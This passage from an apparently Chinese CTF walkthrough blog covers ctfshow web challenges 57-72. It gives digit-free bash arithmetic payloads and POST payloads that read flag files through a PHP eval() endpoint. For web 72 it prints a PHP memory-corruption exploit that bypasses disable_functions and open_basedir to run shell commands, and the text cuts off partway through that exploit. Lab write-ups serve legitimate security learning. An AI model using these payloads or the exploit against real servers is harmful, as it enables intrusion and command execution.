id="二-解题思路：-25"><a href="#二-解题思路：-25" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>取反：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先看等号左边(100) 的二进制表示为: 0110 0100 按位取反的意思就是每一位取反，0变1，1变0</span><br><span class="line">所以: ~100 的二进制表示为：1001 1011 所以等号左边=1001 1011</span><br><span class="line"></span><br><span class="line">再看右边</span><br><span class="line">-101. 一旦看到出现负数，那么这个数一定是按有符号数的规则来表示的。一个二进制数 按位取反并加一以后就可以得到它自己的负数的补码，也就是说： ~x+1=-x 所以，我们把101按位取反加一 先取反：</span><br><span class="line">~101=10011010 再加一： ~101+1=10011011=-101 所以等号右边=10011011=左边，所以等号成立。</span><br></pre></td></tr></table></figure><p><code> 双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #返回上一次的执行结果</span><br><span class="line">echo $(()) #0</span><br><span class="line">echo $((~$(()))) #~0是-1</span><br><span class="line">$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2</span><br><span class="line">echo $((~-37)) #~-37是36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(($((~$(())))$((~$(())))))==-2 //$((~$(())))==-1 中间有两个所以是-2 是相加的</span><br></pre></td></tr></table></figure><p>那-37就需要中间有37个<code>$((~$(())))</code></p><p>然后取反就是36</p><p>playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-58"><a href="#web-58" class="headerlink" title="web 58"></a>web 58</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码-6"><a href="#一-分析代码-6" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p><p>如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。</p><p>经过测试它在后端开启了disable_functions禁用了system exec popen passthru</p><h2 id="二-解题思路：-26"><a href="#二-解题思路：-26" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>使用读文件函数拿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure><p>构造playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure><h1 id="web-59"><a href="#web-59" class="headerlink" title="web 59"></a>web 59</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码-7"><a href="#一-分析代码-7" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>过滤了更多的函数</p><p>但是还可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br></pre></td></tr></table></figure><h2 id="二-解题思路：-27"><a href="#二-解题思路：-27" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//在源代码</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line =fgetcsv($a);print_r($line);&#125;</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-60"><a href="#web-60" class="headerlink" title="web 60"></a>web 60</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码-8"><a href="#一-分析代码-8" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>同时也是过滤了函数</p><h2 id="二-解题思路：-28"><a href="#二-解题思路：-28" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>奇淫技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#通过复制，重命名读取php文件内容  </span><br><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);         </span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</span><br><span class="line">#访问flag.txt </span><br></pre></td></tr></table></figure><h1 id="web-61-65"><a href="#web-61-65" class="headerlink" title="web 61-65"></a>web 61-65</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="一-分析代码-9"><a href="#一-分析代码-9" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>禁用某些函数，但是并不影响show_source</p><h2 id="二-解题思路：-29"><a href="#二-解题思路：-29" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>Web58和Web60 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web-66-67"><a href="#web-66-67" class="headerlink" title="web 66-67"></a>web 66-67</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码-10"><a href="#一-分析代码-10" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>flag的位置变到了根目录</p><p>show_source()函数被禁用了换成highlight_file()</p><h2 id="二-解题思路：-30"><a href="#二-解题思路：-30" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&quot;/&quot;)); #查看根目录文件 print_r被过滤可以换var_dump</span><br><span class="line"># 注意根目录是flag.txt</span><br><span class="line">c=highlight_file(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure><h1 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h1><h2 id="一-分析代码-11"><a href="#一-分析代码-11" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>读文件的所有函数都不能用了</p><h2 id="二-解题思路：-31"><a href="#二-解题思路：-31" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;)); # flag还是在根目录下</span><br><span class="line"># 利用文件包含inculde()读取flag</span><br><span class="line">c=include(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure><h1 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69-70:"></a>web 69-70:</h1><h2 id="一-分析代码-12"><a href="#一-分析代码-12" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>var_dump()函数被ban，那就用var_export()函数</p><h2 id="二-解题思路：-32"><a href="#二-解题思路：-32" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-10"><a href="#方法一：-10" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure><h3 id="方法二：-10"><a href="#方法二：-10" class="headerlink" title="方法二："></a>方法二：</h3><p>使用遍历数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 多种遍历数组姿势</span><br><span class="line"># 1</span><br><span class="line">c=$a=scandir(&quot;/&quot;);foreach($a as $value)&#123;echo $value.&quot;---&quot;;&#125;</span><br><span class="line"># 2 glob() 函数返回匹配指定模式的文件名或目录。返回的是数组</span><br><span class="line">c=$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line"># 3 </span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure><h1 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><h2 id="一-分析代码-13"><a href="#一-分析代码-13" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$s = ob_get_contents();//得到缓冲区的数据。</span><br><span class="line">ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span><br></pre></td></tr></table></figure><h2 id="二-解题思路：-33"><a href="#二-解题思路：-33" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p><code>c=var_export(scandir(&#39;/&#39;));</code>发现输出的一大堆问号，原来是源码中用函数将缓冲区的所有字符全部替换为问号，那么可以用<code>exit()/die()</code>提前结束，这样就不会将字符替换为问号</p><p>由于清空输出缓冲区 传入的命令也就无法执行 这里要做的就是把代码终止在清空输出缓冲区之前使用exit()强制退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br><span class="line"># flag.txt 在根目录下</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h1 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><h2 id="一-分析代码-14"><a href="#一-分析代码-14" class="headerlink" title="一.分析代码:"></a>一.分析代码:</h2><p>存在open_basedir，利用glob伪协议在筛选目录时不受open_basedir制约</p><h2 id="二-解题思路：-34"><a href="#二-解题思路：-34" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>注：POST不会自动进行URL编码，需手动使用URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">exit();</span><br></pre></td></tr></table></figure><p>关于DirectoryIterator：<a href="https://www.ziruchu.com/art/286">https://www.ziruchu.com/art/286</a></p><p>知道了文件是/flag0.txt之后，就要想办法绕过open_basedir和disable_functions来读了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">pwn(&quot;ls /;cat /flag0.txt&quot;);</span><br><span class="line"> </span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace(); # ;)</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&#x27;%c&#x27;,$ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&#x27;%c&#x27;,$v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"> </span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"> </span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"> </span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = 